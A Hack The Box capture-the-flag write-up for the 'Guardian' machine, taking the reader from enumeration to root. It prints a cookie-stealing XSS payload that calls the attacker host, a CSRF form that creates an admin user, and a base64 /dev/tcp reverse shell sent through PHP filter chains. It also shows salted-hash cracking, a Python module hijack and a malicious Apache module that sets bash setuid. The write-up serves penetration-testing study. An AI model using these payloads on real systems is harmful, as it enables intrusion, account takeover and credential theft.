- - - 
created : 24-09-2025 

Tags : #hard

Released on 30 Aug 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Guardian/user]
└─$ rustscan -a guardian.htb -- -A

Open 10.10.11.84:22
Open 10.10.11.84:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Guardian University - Empowering Future Leaders
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19

```
# Enumeration
## HTTP (80)

![Pasted image 20250924184450.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924184450.png)
### Subdomain

We can see the `Student Portal` button points to `portal.guardian.htb`, let's add it to our `/etc/hosts` file and visit:

![Pasted image 20250924184654.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924184654.png)
## Dirbuster

We run [Dirsearch](../../../3%20-%20Tags/Hacking%20Tools/Dirsearch.md) for vectors:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Guardian/user]
└─$ dirsearch -u http://portal.guardian.htb

[18:48:32] 301 -  326B  - /admin  ->  http://portal.guardian.htb/admin/     
[18:48:32] 301 -  326B  - /admin  ->  http://portal.guardian.htb/admin/     
[18:49:19] 301 -  329B  - /includes  ->  http://portal.guardian.htb/includes/
[18:49:21] 301 -  331B  - /javascript  ->  http://portal.guardian.htb/javascript/
[18:49:25] 200 -    1KB - /login.php
[18:49:49] 301 -  327B  - /static  ->  http://portal.guardian.htb/static/   

[18:49:59] 200 -    0B  - /vendor/autoload.php                              
[18:49:59] 200 -    0B  - /vendor/composer/autoload_real.php                
[18:49:59] 200 -    0B  - /vendor/composer/autoload_psr4.php
[18:49:59] 200 -    0B  - /vendor/composer/autoload_classmap.php
[18:49:59] 200 -    0B  - /vendor/composer/autoload_static.php              
[18:49:59] 200 -    1KB - /vendor/composer/LICENSE
[18:49:59] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[18:49:59] 200 -    0B  - /vendor/composer/ClassLoader.php                  
[18:49:59] 200 -   25KB - /vendor/composer/installed.json                   
```

http://portal.guardian.htb/vendor/composer/LICENSE

```bash
Copyright (c) Nils Adermann, Jordi Boggiano

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished
to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

Found http://portal.guardian.htb/static/downloads/Guardian_University_Student_Portal_Guide.pdf

```bash
Guardian University Student Portal Guide

Welcome to the Guardian University Student Portal! This guide will help you get started and
ensure your account is secure. Please read the instructions below carefully.

Important Login Information:

1. Your default password is: GU1234
2. For security reasons, you must change your password immediately after your first login.
3. To change your password:
- Log in to the student portal.
- Navigate to 'Account Settings' or 'Profile Settings'.
- Select 'Change Password' and follow the instructions.

Portal Features:

The Guardian University Student Portal offers a wide range of features to help you manage
your academic journey effectively. Key features include:
- Viewing your course schedule and timetables.
- Accessing grades and academic records.
- Submitting assignments and viewing feedback from faculty.
- Communicating with faculty and peers via the messaging system.
- Staying updated with the latest announcements and notices.

Tips for First-Time Users:
- Bookmark the portal login page for quick access.
- Use a strong, unique password for your account.
- Familiarize yourself with the portal layout and navigation.
- Check your inbox regularly for important updates.

Need Help?
If you encounter any issues while logging in or changing your password, please contact the
IT Support Desk at:
Email: support@guardian.htb

Remember, your student portal is the gateway to your academic journey at Guardian
University. Keep your credentials secure and never share them with anyone.
```

`/forgot.php`

![Pasted image 20250924191941.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250924191941.png)

We can see the `ID` format here, i'll take it as an hint.

We can see IDs on the main page, `Testinmonials`:

![Pasted image 20250925131308.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925131308.png)

We can adjust the format:

```bash
GU + 3num + Year
```

If you try the first one it works for login with default password, from here i will briefly show how to crack it (in case they don't give us working creds).
## Foothold
### Custom wordlist

We can use this [script](https://github.com/mdn0x/Scripts/blob/main/Scripts/simple_wordlist.py):

```python
#!/usr/bin/env python3
#  GU +3 (000-500) + 4 (2020-2025)

outfile = "ID.txt"
with open(outfile, "w") as f:
    for a in range(0, 500):           # 000..499
        a_str = f"{a:03d}"
        for b in range(2020, 2025):      # 001..999
                f.write(f"GU{a_str}{b:04d}\n")
print(f"Wrote {outfile}")
```

```bash
─$ nano script.py    

─$ chmod +x script.py 

─$ python3 script.py 
Wrote ID.txt

# Check length

─$ wc -l Id_long.txt
2500 ID.txt
```
### Caido Spraying

We need to find a valid `ID` for the default password, we automate with [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md)

Seems cookie is blocked after a while, trying no cookie.

Found working credentials:

```bash
username: HTB{REDACTED_PASSWD}
```

Yes they gave us that, i didn't thought about trying those IDs before 'cause too easy. **LESSON : MISS (Make It Stupid Simple)** + **Cracking Practice**
### Login

Now we can login:

![Pasted image 20250925131936.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925131936.png)
# ExploitChain
## ID Fuzzing

We use [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) to fuzz the parameter with numbers:

![Pasted image 20250925143447.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925143447.png)

```bash
└─$ seq 1 10 > fuzz.txt      # Create numberlist                  

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Guardian/user]
└─$ ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w fuzz.txt -H 'Cookie: PHPSESSID=q6e7po0cdgnggpbpstdsrf8q7d' -fs 5761 -v
_____________

 :: Method           : GET
 :: URL              : http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2
 :: Wordlist         : FUZZ: /home/mdn0x/HTB/Machines/Guardian/user/fuzz.txt
 :: Header           : Cookie: PHPSESSID=q6e7po0cdgnggpbpstdsrf8q7d
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 5761
________________________________________________

[Status: 200, Size: 6849, Words: 2770, Lines: 178, Duration: 291ms]
| URL | http://portal.guardian.htb/student/chat.php?chat_users[0]=31&chat_users[1]=32
    * FUZZ: 3

[Status: 200, Size: 6859, Words: 2771, Lines: 178, Duration: 1550ms]
| URL | http://portal.guardian.htb/student/chat.php?chat_users[0]=11&chat_users[1]=12
    * FUZZ: 1

```

1. 
![Pasted image 20250925144044.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925144044.png)
2. 
![Pasted image 20250925144102.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925144102.png)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Guardian/user]
└─$ ffuf -u 'http://portal.guardian.htb/student/chat.php?chat_users[0]=FUZZ1&chat_users[1]=FUZZ2' -w fuzz.txt:FUZZ1 -w fuzz.txt:FUZZ2 -H 'Cookie: PHPSESSID=q6e7po0cdgnggpbpstdsrf8q7d' -fl 178,164  -v      

[Status: 200, Size: 7302, Words: 3055, Lines: 185, Duration: 146ms]
| URL | http://portal.guardian.htb/student/chat.php?chat_users[0]=1&chat_users[1]=2
    * FUZZ1: 1
    * FUZZ2: 2

[Status: 200, Size: 7306, Words: 3055, Lines: 185, Duration: 146ms]
| URL | http://portal.guardian.htb/student/chat.php?chat_users[0]=2&chat_users[1]=1
    * FUZZ1: 2
    * FUZZ2: 1
```

Got `gitea` password:

![Pasted image 20250925144545.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925144545.png)

 `jamil.enockson@guardian.htb`  :  `HTB{REDACTED_PASSWD}`

We add id to `/etc/hosts` and login:

```bash
10.10.11.84 gitea.guardian.htb portal.guardian.htb guardian.htb
```

![Pasted image 20250925150955.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925150955.png)

No vulns found for `v1.23.7`.

The database credentials can be found in the config of `portal.guardian.htb`:

```bash
└─$ cat config.php       
<?php
return [
    'db' => [
        'dsn' => 'mysql:host=localhost;dbname=guardiandb',
        'username' => 'root',
        'password' => 'HTB{REDACTED_PASSWD}',
        'options' => []
    ],
    'salt' => '8Sb)tM1vs1SS'
];
```
## XSS

Check `composer.json`:

![Pasted image 20250925152415.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925152415.png)

Searching for `phpspreadsheet`, it seems that there are many [Cross-site Scripting (XSS)](../../../3%20-%20Tags/Hacking%20Concepts/Cross-site%20Scripting%20(XSS).md) vulnerabilities.

Found Zero-day

![Pasted image 20250925152539.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925152539.png)
### phpspreadsheet exploit for Cookies

 Short analysis:

- Affected functions:`generateNavigation()`
- Question: `$sheet->getTitle()`Directly splicing into HTML `<a>`tags, no `htmlspecialchars()`.
- Scenario: When **the XLSX has multiple worksheets** , a navigation menu is generated.
- As long as the attacker can control **the worksheet name** of the Excel table , it can be triggered.

Use:

- An attacker would need to upload or have the victim open **a maliciously crafted XLSX file** .
- The server `PhpSpreadsheet\Writer\Html`converts it to HTML and outputs it.
- When a user visits this converted page, the **XSS** is triggered.

**Some python libraries and some online editing websites limit the length of sheet names or special characters.**

1. We create the file with [FastSheet](https://www.treegrid.com/FSheet), add a new sheet and rename it:

Payload:
```http
"> <img src=x onerror=fetch("http://10.10.14.167/?c="+btoa(document.cookie))>
```

![Pasted image 20250925155343.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925155343.png)

2. Export:

![Pasted image 20250925155459.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925155459.png)

3. Now we open a server and upload in `assignments`:

![Pasted image 20250925155907.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925155907.png)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Guardian/user/scripts]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [25/Sep/2025 17:01:51] "GET /?c=%27+btoa(document.cookie) HTTP/1.1" 200 -
10.10.11.84 - - [25/Sep/2025 17:04:04] "GET /?c=UEhQU0VTU0lEPWFvMGl0ZjdoY2ltdWpscnBwZW9vbGwxc21x HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

─$ echo 'UEhQU0VTU0lEPWFvMGl0ZjdoY2ltdWpscnBwZW9vbGwxc21x' | base64 -d 
PHPSESSID=ao0itf7hcimujlrppeooll1smq    
```

Paste and reload:

![Pasted image 20250925170718.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925170718.png)

Found that it was not `admin`, but `teacher` user, enter the `Notice Board` and find that you can leave a message, and the message link will be viewed by the admin.  (maybe XSS here too)

Go back to `gitea` and check the source code `createuser.php`:

```bash
1. admin can create new users
2. The logic of csrf_token can be seen in csrf-tokens.php:
       No deletion logic for csrf_token (reusable)
```
### CSRF exploit for Admin login

We grab existing CSRF:

![Pasted image 20250925170923.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925170923.png)

We can use [this script]() to make an `admin` create a new user with privileges:

```html
─$ nano CSRF.html                                                                                                                 

─$ cat CSRF.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF Exploit</title>
</head>
<body>
<h1>CSRF Exploit</h1>
<form id="csrfForm" action="http://portal.guardian.htb/admin/createuser.php" method="POST">
    <input type="hidden" name="username" value="Hacker">
    <input type="hidden" name="password" value="Hacker123!">
    <input type="hidden" name="full_name" value="mdn0x">
    <input type="hidden" name="email" value="admin@example.com">
    <input type="hidden" name="dob" value="2000-01-01">
    <input type="hidden" name="address" value="123 Hackers Street">
    <input type="hidden" name="user_role" value="admin">
    <input type="hidden" name="csrf_token" value="f2fb9a19d7d1ad2a349db38f78f7c782">
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
</body>
</html>
```

We need to open a server and send a message:

![Pasted image 20250925171326.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925171326.png)

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Guardian/user/scripts]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.84 - - [25/Sep/2025 17:13:48] "GET /CSRF.html HTTP/1.1" 200 -
```

We can logout and re-login with the created account:

```
Hacker: Hacker123!
```

![Pasted image 20250925171611.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925171611.png)
## LFI

We have a parameter in `Reports` URL, tried using php-filtering to test, it's sanitized.

Back to gitea to view the source code of `report.php`:

```php
<?php
require '../includes/auth.php';
require '../config/db.php';

if (!isAuthenticated() || $_SESSION['user_role'] !== 'admin') {
    header('Location: /login.php');
    exit();
}

$report = $_GET['report'] ?? 'reports/academic.php';

if (strpos($report, '..') !== false) {
    die("<h2>Malicious request blocked 🚫 </h2>");
}   

if (!preg_match('/^(.*(enrollment|academic|financial|system)\.php)$/', $report)) {
    die("<h2>Access denied. Invalid file 🚫</h2>");
}

?>
```

1. If the path contains `..`(directory traversal attempt), it will be rejected directly.
2. Files allowed: `enrollment.php`, `academic.php`, `financial.php`, `system.php`(and their possible path prefixes). If they do not match, it will be rejected directly. 
### php-filter-chains RCE 

`php_filter_chains` can be used here. If we add `system.php` at the end of the URL this will not affect the execution result:

![Pasted image 20250925172938.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925172938.png)

We can obtain a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md).

1.  Create the chain:
```bash
└─$ python php_filter_chain_generator.py --chain '<?php eval($_POST["x"]);?>'  
```

2. Open  [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) listener:
```bash
└─$ nc -lvnp 1337           
listening on [any] 1337 ...
```

3. Paste the filter and send a `POST` with the bash shell payload:

```php
x=system("printf c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTI4LzEzMzcgMD4mMQ|base64 -d|bash");
```

![Pasted image 20250925180221.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250925180221.png)

Using HackBar extension:

![Pasted image 20250927172920.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250927172920.png)

Got it:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Guardian/user/scripts]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
whoami
connect to [10.10.14.128] from (UNKNOWN) [10.10.11.84] 37386
sh: 0: can't access tty; job control turned off
$ www-data
$ ls
chat.php
chats.php
courses.php
createuser.php
enrollments.php
index.php
notices
profile.php
reports
reports.php
settings.php
users.php
```

We perform [Shell Stabilization](../../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) now:

```bash
$ export TERM=xterm
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
bash-5.1$ ^Z
zsh: suspended  nc -lvnp 1337
                                                                                                                     
┌──(mdn0x㉿mdn0xKali)-[~/…/Machines/Guardian/user/scripts]
└─$ stty raw -echo;fg        
[1]  + continued  nc -lvnp 1337
                               reset
```
# Lateral Movement - Privilege Escalation
## www-data to Jamil

We can see the database port is open, and the database password is known so we can connect:

```bash
bash-5.1$ ss -tuln
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:3000         0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128               [::]:22              [::]:*            
bash-5.1$ 
```

and the database password is known :  `Gu4rd14n_HTB{REDACTED_PASSWD}`

So we can connect:

```bash
bash-5.1$ mysql -u root -p 
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 171117
Server version: 8.0.43-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| guardiandb         |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use guardiandb
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------------+
| Tables_in_guardiandb |
+----------------------+
| assignments          |
| courses              |
| enrollments          |
| grades               |
| messages             |
| notices              |
| programs             |
| submissions          |
| users                |
+----------------------+
9 rows in set (0.00 sec)

mysql> select * from users;
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
| user_id | username           | password_hash                                                    | full_name            | email                           | dob        | address                                                                       | user_role | status | created_at          | updated_at          |
+---------+--------------------+------------------------------------------------------------------+----------------------+---------------------------------+------------+-------------------------------------------------------------------------------+-----------+--------+---------------------+---------------------+
|       1 | admin              | HTB{REDACTED_HASH} | System Admin         | admin@guardian.htb              | 2003-04-09 | 2625 Castlegate Court, Garden Grove, California, United States, 92645         | admin     | active | 2025-09-27 15:30:02 | 2025-09-27 15:30:02 |
|       2 | jamil.enockson     | HTB{REDACTED_HASH} | Jamil Enocksson      | jamil.enockson@guardian.htb     | 1999-09-26 | 1061 Keckonen Drive, Detroit, Michigan, United States, 48295                  | admin     | active | 2025-09-27 15:30:02 | 2025-09-27 15:30:02 |
|       3 | mark.pargetter     | HTB{REDACTED_HASH} | Mark Pargetter       | mark.pargetter@guardian.htb     | 1996-04-06 | 7402 Santee Place, Buffalo, New York, United States, 14210                    | admin     | active | 2025-09-27 15:30:02 | 2025-09-27 15:30:02 |
|       4 | valentijn.temby    | HTB{REDACTED_HASHD} | Valentijn Temby      | valentijn.temby@guardian.htb    | 1994-05-06 | 7429 

<SNIP>
```

The interesting ones:

```
| username           | password_hash                                                    |
+--------------------+------------------------------------------------------------------+
| admin              | HTB{REDACTED_HASH} |
| jamil.enockson     | HTB{REDACTED_HASH} |
| mark.pargetter     | HTB{REDACTED_HASH} |
| valentijn.temby    | HTB{REDACTED_HASH} |
| leyla.rippin       | HTB{REDACTED_HASH} |
| perkin.fillon      | HTB{REDACTED_HASH} |
| cyrus.booth        | HTB{REDACTED_HASH} |
| sammy.treat        | HTB{REDACTED_HASH} |
| crin.hambidge      | HTB{REDACTED_HASH} |
| myra.galsworthy    | HTB{REDACTED_HASH} |
| mireielle.feek     | HTB{REDACTED_HASH} |
| vivie.smallthwaite | HTB{REDACTED_HASH} |
```

In `createuser.php`, we know that the password generation logic is salted [SHA-256](../../../3%20-%20Tags/Hacking%20Concepts/SHA-256.md), and the salt value is in `config.php`:

```bash
	   'salt' => '8Sb)tM1vs1SS'
```

Logic: Plain text password + salt value → SHA256

### Cracking

We save the hashes in a file (the format `"user:hash"` is important for scripts):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/…/Guardian/user/scripts/personal]
└─$ cat hashes 
```

And feel free to use this [script]():

```python
import hashlib

SALT = "8Sb)tM1vs1SS"
WORDLIST = "/usr/share/wordlists/rockyou.txt"
HASH_FILE = "hashes.txt"

def check_password(password: str, target_hash: str) -> bool:
    hashed = hashlib.sha256((password + SALT).encode()).hexdigest()
    return hashed == target_hash

with open(HASH_FILE, "r") as f:
    for line in f:
        user, target_hash = line.strip().split(":")
        with open(WORDLIST, "r", encoding="latin-1", errors="ignore") as wf:
            for pwd in wf:
                pwd = pwd.strip()
                if check_password(pwd, target_hash):
                    print(f"[+] Found password for {user}: {pwd}")
                    break
            else:
                print(f"[-] Password for {user} not found")
```

```bash
─$ nano crack.py

─$ chmod +x crack.py  

└─$ python3 crack.py
[+] Found password for admin: fakebake000
[+] Found password for jamil.enockson: copperhouse56
```

We cracked 2 of them.
### SSH 

We can use the previous shell or [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md) for `jamil`:

```bash
-bash-5.1$ whoami
jamil

-bash-5.1$ cat user.txt                                                                                              
    HTB{REDACTED_FLAG}     
```
## Jamil to Mark

We can check `sudo -l`:

```bash
-bash-5.1$ sudo -l                                                                                                   
Matching Defaults entries for jamil on guardian:                                                                     
    env_reset, mail_badpass,                                                                                         
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty                
                                                                                                                     
User jamil may run the following commands on guardian:                                                               
    (mark) NOPASSWD: /opt/scripts/utilities/utilities.py         
```

We check the code:

```python
#!/usr/bin/env python3

import argparse
import getpass
import sys

from utils import db
from utils import attachments
from utils import logs
from utils import status


def main():
    parser = argparse.ArgumentParser(description="University Server Utilities Toolkit")
    parser.add_argument("action", choices=[
        "backup-db",
        "zip-attachments",
        "collect-logs",
        "system-status"
    ], help="Action to perform")
    
    args = parser.parse_args()
    user = getpass.getuser()

    if args.action == "backup-db":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        db.backup_database()
    elif args.action == "zip-attachments":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        attachments.zip_attachments()
    elif args.action == "collect-logs":
        if user != "mark":
            print("Access denied.")
            sys.exit(1)
        logs.collect_logs()
    elif args.action == "system-status":
        status.system_status()
    else:
        print("Unknown action.")

if __name__ == "__main__":
    main()
```

If you perform the first three operations, you must be `mark`a user, otherwise access is denied, `system-status` is unrestricted.

We can find a writable file:

```bash
bash-5.1$ cd /opt/scripts/utilities/utils
bash-5.1$ ls
attachments.py  db.py  logs.py  status.py
bash-5.1$ ls -la
total 24
drwxrwsr-x 2 root root   4096 Jul 10 14:20 .
drwxr-sr-x 4 root admins 4096 Jul 10 13:53 ..
-rw-r----- 1 root admins  287 Apr 19 08:15 attachments.py
-rw-r----- 1 root admins  246 Jul 10 14:20 db.py
-rw-r----- 1 root admins  226 Apr 19 08:16 logs.py
-rwxrwx--- 1 mark admins   33 Sep 26 18:56 status.py
```

We can add the shell and execute the script:

```bash
<SNIP>
bash-5.1$ cat status.py 
import os;os.system("/bin/bash")

bash-5.1$ sudo -u mark /opt/scripts/utilities/utilities.py
bash-5.1$ whoami
mark
```
## Mark to Root

Again `sudo -l`:

```bash
bash-5.1$ sudo -l
Matching Defaults entries for mark on guardian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mark may run the following commands on guardian:
    (ALL) NOPASSWD: /usr/local/bin/safeapache2ctl
```

We download the compiled binary:

```bash
─$ nc -lvnp 1337 > safeapache2ctl

bash-5.1$ cat safeapache2ctl > /dev/tcp/10.10.14.128/1337
```
### Decompilation and Exploit

First we detect file type and info:

```bash
└─$ file safeapache2ctl 
safeapache2ctl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0690ef286458863745e17e8a81cc550ced004b12, for GNU/Linux 3.2.0, not stripped

└─$ readelf -h safeapache2ctl                                             
Intestazione ELF:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Classe:                            ELF64
  Dati:                              complemento a 2, little endian
  Version:                           1 (current)
  SO/ABI:                            UNIX - System V
  Versione ABI:                      0
  Tipo:                              DYN (Position-Independent Executable file)
  Macchina:                          Advanced Micro Devices X86-64
  Versione:                          0x1
  Indirizzo punto ingresso:        0x11e0
  Inizio intestazioni di programma   64 (byte nel file)
  Inizio intestazioni di sezione:    14632 (byte nel file)
  Flag:                              0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         13
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 30
```

Second we check metadata:

```bash
─$ strings safeapache2ctl 
<SNIP>

─$ ldd safeapache2ctl 
        linux-vdso.so.1 (0x00007f460a156000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4609f39000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f460a158000)

└─$ objdump -f safeapache2ctl

safeapache2ctl:     formato del file elf64-x86-64
architettura: i386:x86-64, flag 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
indirizzo di partenza 0x00000000000011e0
```

We can use a lot of tool to decompile the following code:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  FILE *stream; // [rsp+18h] [rbp-1418h]
  char s[1024]; // [rsp+20h] [rbp-1410h] BYREF
  char resolved[16]; // [rsp+420h] [rbp-1010h] BYREF
  unsigned __int64 v7; // [rsp+1428h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( argc == 3 && !strcmp(argv[1], "-f") )
  {
    if ( realpath(argv[2], resolved) )
    {
      if ( (unsigned int)starts_with(resolved, "/home/mark/confs/") )
      {
        stream = fopen(resolved, "r");
        if ( stream )
        {
          while ( fgets(s, 1024, stream) )
          {
            if ( (unsigned int)is_unsafe_line(s) )
            {
              fwrite("Blocked: Config includes unsafe directive.\n", 1uLL, 0x2BuLL, stderr);
              fclose(stream);
              return 1;
            }
          }
          fclose(stream);
          execl("/usr/sbin/apache2ctl", "apache2ctl", "-f", resolved, 0LL);
          perror("execl failed");
          return 1;
        }
        else
        {
          perror("fopen");
          return 1;
        }
      }
      else
      {
        fprintf(stderr, "Access denied: config must be inside %s\n", "/home/mark/confs/");
        return 1;
      }
    }
    else
    {
      perror("realpath");
      return 1;
    }
  }
  else
  {
    fprintf(stderr, "Usage: %s -f /home/mark/confs/file.conf\n", *argv);
    return 1;
  }
}
```

There is a `is_unsafe_line` function inside too:

```c
__int64 __fastcall is_unsafe_line(__int64 a1)
{
  char s1[32]; // [rsp+10h] [rbp-1030h] BYREF
  char v3[16]; // [rsp+30h] [rbp-1010h] BYREF
  unsigned __int64 v4; // [rsp+1038h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  if ( (unsigned int)__isoc99_sscanf(a1, "%31s %1023s", s1, v3) != 2 )
    return 0LL;
  if ( strcmp(s1, "Include") && strcmp(s1, "IncludeOptional") && strcmp(s1, "LoadModule")
    || v3[0] != 47
    || (unsigned int)starts_with(v3, "/home/mark/confs/") )
  {
    return 0LL;
  }
  fprintf(stderr, "[!] Blocked: %s is outside of %s\n", v3, "/home/mark/confs/");
  return 1LL;
}
```

We can see as long as the command parameter is in the `/home/mark/confs/` directory, it is considered **SAFE**.

We can use the `Loadmodule` to compile the following [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md)  :

**evil.c**
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    system("chmod +s /bin/bash");
}
```

Steps:

```bash
$ bash-5.1$ nano evil.c

$ gcc -shared -fPIC -o /home/mark/confs/evil.so /home/mark/evil.c

$ cat <<EOF > /home/mark/confs/exploit.conf
LoadModule evil_module /home/mark/confs/evil.so
EOF

$ sudo /usr/local/bin/safeapache2ctl -f /home/mark/confs/exploit.conf
apache2: Syntax error on line 1 of /home/mark/confs/exploit.conf: Can't locate API module structure `evil_module' in file /home/mark/confs/evil.so: /home/mark/confs/evil.so: undefined symbol: evil_module
Action '-f /home/mark/confs/exploit.conf' failed.
The Apache error log may have more information.

bash-5.1$ bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
    HTB{REDACTED_FLAG}
```

Pwned !! 